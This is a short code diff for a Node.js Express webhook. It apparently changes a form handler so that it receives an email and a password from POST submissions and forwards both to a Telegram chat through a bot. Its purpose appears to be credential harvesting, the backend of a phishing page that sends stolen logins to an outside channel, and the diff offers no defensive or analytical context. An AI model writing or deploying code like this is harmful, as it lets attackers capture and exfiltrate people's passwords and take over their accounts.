@@ -14,9 +14,9 @@ const bot = new TelegramBot(botToken);
 
 // Webhook route — this receives POST requests
 app.post('/webhook', async (req, res) => {
-  const { email, data1 } = req.body;
+  const { email, password } = req.body;
 
-  const message = `📩 New Submission:\n\nEmail: ${email}\nData1: ${data1}`;
+  const message = `📩 New Submission:\n\nEmail: ${email}\npassword: ${password}`;
 
   try {
     await bot.sendMessage(chatId, message);
